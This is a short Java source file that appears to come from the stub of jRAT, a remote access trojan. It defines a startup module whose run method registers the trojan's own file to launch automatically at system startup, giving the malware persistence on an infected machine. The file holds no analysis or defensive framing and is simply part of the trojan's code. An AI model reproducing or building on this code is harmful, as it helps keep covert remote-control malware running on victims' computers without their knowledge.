package io.jrat.stub.modules.startup;

import io.jrat.stub.Configuration;
import java.util.Map;
import startuplib.Startup;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		try {
			Startup.add(Configuration.getFileName());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
